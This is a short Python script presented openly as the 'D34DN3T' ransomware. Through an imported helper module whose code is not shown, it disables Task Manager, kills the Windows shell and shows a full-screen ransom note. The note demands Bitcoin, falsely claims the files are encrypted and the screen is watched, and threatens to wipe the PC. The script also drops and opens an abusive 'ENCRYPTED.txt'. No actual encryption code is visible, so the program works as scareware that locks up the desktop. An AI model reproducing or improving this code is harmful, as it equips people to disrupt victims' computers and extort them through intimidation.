import os
import venn as vn

class DisableTaskManager:
    vn.disabletaskmanager()

class TaskKill:
    vn.taskkillexplorer()

class PopUpGUI:
    TITLEMSG = "!!! D34DN3T RANSOMWARE !!!"
    BTCADDRESS = "abcdefghijklabcdefghijklmnoprsqtzyvx20mnoprsqtzyvx20"
    MSG = f"""    
    Hello, you got infected by a ransomware called D34DN3T. At this point, your files are encrypted and
    no one can help you. Only thing you can do is to pay via Bitcoins. Price of decryption is 20€.
    If you do not know how to pay check some tutorials on google or youtube. Do not try to
    remove or delete this ransomware, but if you do, then everything in your PC will be deleted,
    within a seconds. I can see your screen and I see what you are doing on your PC, so dont be silly.
    Lets hop into it.
    Bitcoin Address is -> {BTCADDRESS}
"""
    vn.creategui(boxgeometry="1920x1080",textbox_height=30,textbox_width=90,bgcolor="#FF0000",
    message=MSG,title="VIRUS",textboxcolor="#161616",titlemessage=TITLEMSG)

class PlayVideo:
    vn.videoplay(path_to_video="video/trim.mp4")

class ENCRYPTION:
    ENCRYPTED_MESSAGE = "!!! ALL FILES ENCRYPTED !!!"
    vn.encryption_text_gui(boxgeometry="0x0",title="ENCRYPTED",bgcolor="white",titlemessage=ENCRYPTED_MESSAGE,imagePath="images/closed.png")

class CreateFiles:
    followInstructions = """Please follow the instructions:
1. FUCK OFF
2. FUCK OFF YOUR PC IS DEAD
"""
    vn.createf(createfile="ENCRYPTED.txt",writetofile=followInstructions)
    vn.callcommand("start ENCRYPTED.txt")
